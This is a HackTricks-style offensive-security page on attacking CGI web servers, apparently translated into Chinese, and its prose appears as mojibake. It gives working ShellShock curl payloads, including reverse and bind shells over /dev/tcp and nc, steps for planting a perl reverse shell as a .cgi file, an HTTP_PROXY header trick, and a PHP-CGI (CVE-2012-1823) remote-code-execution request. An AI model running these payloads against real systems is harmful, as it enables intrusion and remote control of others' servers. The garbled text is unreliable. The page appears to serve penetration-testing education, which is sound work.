<details>

<summary><strong>é›¶åŸºç¡€å­¦ä¹ AWSé»‘å®¢æ”»å‡»æˆä¸ºè‹±é›„</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


# ä¿¡æ¯

**CGIè„šæœ¬æ˜¯perlè„šæœ¬**ï¼Œå› æ­¤ï¼Œå¦‚æœæ‚¨å·²ç»æ”»ç ´äº†å¯ä»¥æ‰§è¡Œ _**.cgi**_ è„šæœ¬çš„æœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥ **ä¸Šä¼ ä¸€ä¸ªperlåå‘shell** \(`/usr/share/webshells/perl/perl-reverse-shell.pl`\)ï¼Œå°†æ‰©å±•åä» **.pl** æ”¹ä¸º **.cgi**ï¼Œèµ‹äºˆ **æ‰§è¡Œæƒé™** \(`chmod +x`\) å¹¶é€šè¿‡ **ç½‘ç»œæµè§ˆå™¨è®¿é—®** åå‘shellä»¥æ‰§è¡Œå®ƒã€‚
ä¸ºäº†æµ‹è¯• **CGIæ¼æ´**ï¼Œå»ºè®®ä½¿ç”¨ `nikto -C all` \(åŠå…¶æ‰€æœ‰æ’ä»¶\)

# **ShellShock**

Bashä¹Ÿå¯ä»¥ç”¨æ¥è¿è¡Œåº”ç”¨ç¨‹åºä¼ é€’ç»™å®ƒçš„å‘½ä»¤ï¼Œè€Œè¿™ä¸ªç‰¹æ€§æ­£æ˜¯æ¼æ´å½±å“çš„åœ°æ–¹ã€‚å¯ä»¥å‘é€ç»™Bashçš„ä¸€ç§å‘½ä»¤ç±»å‹å…è®¸è®¾ç½®ç¯å¢ƒå˜é‡ã€‚ç¯å¢ƒå˜é‡æ˜¯åŠ¨æ€çš„ã€å‘½åçš„å€¼ï¼Œå®ƒä»¬å½±å“è®¡ç®—æœºä¸Šè¿›ç¨‹çš„è¿è¡Œæ–¹å¼ã€‚æ¼æ´åœ¨äºï¼Œ**æ”»å‡»è€…å¯ä»¥åœ¨ç¯å¢ƒå˜é‡ä¸­é™„åŠ æ¶æ„ä»£ç ï¼Œä¸€æ—¦å˜é‡è¢«æ¥æ”¶ï¼Œä»£ç å°±ä¼šè¿è¡Œ**ã€‚

åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œ**é¡µé¢å¯èƒ½ä¼šæŠ›å‡ºé”™è¯¯**ã€‚

æ‚¨å¯ä»¥é€šè¿‡æ³¨æ„åˆ°å®ƒä½¿ç”¨çš„æ˜¯**æ—§ç‰ˆæœ¬çš„Apache**å’Œ**cgi\_mod** \(å¸¦æœ‰cgiæ–‡ä»¶å¤¹\) æˆ–ä½¿ç”¨ **nikto** æ¥**å‘ç°**è¿™ä¸ªæ¼æ´ã€‚

## **æµ‹è¯•**

å¤§å¤šæ•°æµ‹è¯•éƒ½æ˜¯åŸºäºå›æ˜¾æŸäº›å†…å®¹ï¼Œå¹¶æœŸæœ›è¯¥å­—ç¬¦ä¸²åœ¨ç½‘ç»œå“åº”ä¸­è¿”å›ã€‚å¦‚æœæ‚¨è®¤ä¸ºæŸä¸ªé¡µé¢å¯èƒ½å­˜åœ¨æ¼æ´ï¼Œè¯·æœç´¢æ‰€æœ‰çš„cgié¡µé¢å¹¶æµ‹è¯•å®ƒä»¬ã€‚

**Nmap**
```bash
nmap 10.2.1.31 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
```
## **Curl \(åå°„å‹ã€ç›²ç›®å‹å’Œå¸¦å¤–\)**
```bash
# Reflected
curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://10.1.2.32/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
# Blind with sleep (you could also make a ping or web request to yourself and monitor that oth tcpdump)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://10.11.2.12/cgi-bin/admin.cgi
# Out-Of-Band Use Cookie as alternative to User-Agent
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4242 0>&1' http://10.10.10.10/cgi-bin/user.sh
```
[**Shellsocker**](https://github.com/liamim/shellshocker)
```bash
python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
```
## åˆ©ç”¨
```bash
#Bind Shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
#Reverse shell
$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
#Reverse shell using curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
#Reverse shell using metasploit
> use multi/http/apache_mod_cgi_bash_env_exec
> set targeturi /cgi-bin/admin.cgi
> set rhosts 10.1.2.11
> run
```
# **ä»£ç†ï¼ˆMitM åˆ° Web æœåŠ¡å™¨è¯·æ±‚ï¼‰**

CGI ä¸º http è¯·æ±‚ä¸­çš„æ¯ä¸ªå¤´åˆ›å»ºä¸€ä¸ªç¯å¢ƒå˜é‡ã€‚ä¾‹å¦‚ï¼š"host:web.com" è¢«åˆ›å»ºä¸º "HTTP\_HOST"="web.com"

ç”±äº HTTP\_PROXY å˜é‡å¯èƒ½è¢« web æœåŠ¡å™¨ä½¿ç”¨ã€‚å°è¯•å‘é€åŒ…å« "**Proxy: &lt;IP\_attacker&gt;:&lt;PORT&gt;**" çš„**å¤´éƒ¨**ï¼Œå¦‚æœæœåŠ¡å™¨åœ¨ä¼šè¯æœŸé—´æ‰§è¡Œä»»ä½•è¯·æ±‚ã€‚æ‚¨å°†èƒ½å¤Ÿæ•è·æœåŠ¡å™¨å‘å‡ºçš„æ¯ä¸ªè¯·æ±‚ã€‚

# æ—§ PHP + CGI = RCEï¼ˆCVE-2012-1823ï¼ŒCVE-2012-2311ï¼‰

åŸºæœ¬ä¸Šï¼Œå¦‚æœ cgi æ´»è·ƒå¹¶ä¸” php æ˜¯â€œæ—§çš„â€ï¼ˆ&lt;5.3.12 / &lt; 5.4.2ï¼‰ï¼Œä½ å¯ä»¥æ‰§è¡Œä»£ç ã€‚
ä¸ºäº†åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œä½ éœ€è¦è®¿é—® web æœåŠ¡å™¨çš„æŸä¸ª PHP æ–‡ä»¶ï¼Œè€Œä¸å‘é€å‚æ•°ï¼ˆç‰¹åˆ«æ˜¯ä¸å‘é€å­—ç¬¦ "="ï¼‰ã€‚
ç„¶åï¼Œä¸ºäº†æµ‹è¯•è¿™ä¸ªæ¼æ´ï¼Œä½ å¯ä»¥è®¿é—®ä¾‹å¦‚ `/index.php?-s`ï¼ˆæ³¨æ„ `-s`ï¼‰ï¼Œ**åº”ç”¨ç¨‹åºçš„æºä»£ç å°†å‡ºç°åœ¨å“åº”ä¸­**ã€‚

ç„¶åï¼Œä¸ºäº†è·å¾—**RCE**ï¼Œä½ å¯ä»¥å‘é€è¿™ä¸ªç‰¹æ®ŠæŸ¥è¯¢ï¼š`/?-d allow_url_include=1 -d auto_prepend_file=php://input` å’Œè¦åœ¨**è¯·æ±‚ä½“ä¸­æ‰§è¡Œçš„**PHP ä»£ç ã€‚
**ç¤ºä¾‹ï¼š**
```bash
curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
```
**å…³äºæ¼æ´å’Œå¯èƒ½çš„åˆ©ç”¨æ–¹æ³•çš„æ›´å¤šä¿¡æ¯ï¼š** [**https://www.zero-day.cz/database/337/**](https://www.zero-day.cz/database/337/)**,** [**cve-2012-1823**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823)**,** [**cve-2012-2311**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311)**,** [**CTF Writeup ç¤ºä¾‹**](https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe)**ã€‚**

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ç›´è‡³æˆä¸ºé«˜æ‰‹ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹çš„ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥ **åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
